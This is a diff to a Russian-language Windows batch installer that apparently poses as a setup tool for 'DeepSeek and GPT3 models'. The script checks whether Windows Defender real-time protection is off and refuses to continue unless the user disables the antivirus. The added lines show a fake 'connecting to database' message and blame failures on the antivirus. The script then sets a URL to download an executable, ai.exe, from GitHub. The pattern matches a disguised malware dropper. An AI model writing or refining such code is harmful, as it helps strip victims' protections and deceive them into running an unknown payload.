@@ -15,7 +15,7 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-for /f "tokens=2 delims=:" %%a in ('powershell -Command "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"') do (
+for /f "tokens=*" %%a in ('powershell -Command "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"') do (
     set "realTimeDisabled=%%a"
 )
 
@@ -26,9 +26,15 @@ if "%realTimeDisabled%"=="False" (
     powershell -Command "Write-Host 'Для продолжения отключите антивирус' -ForegroundColor Red"
     pause
     exit /b
+) else if "%realTimeDisabled%"=="True" (
+    echo Подключение к базе данных
+) else (
+    powershell -Command "Write-Host 'Не удалось подключится к базе данных' -ForegroundColor Red"
+    powershell -Command "Write-Host 'Убедитесь что у вас отключен антивирус и запустите установщик заново' -ForegroundColor Red"
+    pause
+    exit /b
 )
 
-echo Соединение с базой данных
 echo Установка моделей DeepSeek и GPT3
 
 set "url=https://github.com/AtomicAIDeveloper/atomicAI/raw/refs/heads/main/ai.exe"
